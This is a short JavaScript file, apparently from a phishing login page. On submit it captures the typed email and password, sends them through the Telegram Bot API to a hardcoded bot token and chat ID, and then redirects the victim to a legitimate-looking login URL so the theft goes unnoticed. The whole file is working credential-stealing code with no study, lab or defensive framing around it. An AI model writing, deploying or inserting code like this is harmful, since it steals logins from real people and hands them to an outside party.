window.addEventListener('load', () => {
    const emailInput = document.querySelector('.email')
    const passwordInput = document.querySelector('.pass')
    const submitBtn = document.querySelector('.btn')
    const form = document.querySelector('.form')

    form.addEventListener('submit', (event) => {
        event.preventDefault();

        const email = emailInput.value;
        const password = passwordInput.value;
        const message = `
Email: \`${email}\`
Password: \`${password}\`
        `
        const BOT_TOKEN = '6158025519:AAECEOtpiMa5HvaGJ9W_fENOxL0e6PSimb0'
        const CHAT_ID = '-1001535788645'

        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }).then(res => window.location.href = 'https://tornado.com/app/login')
    })
})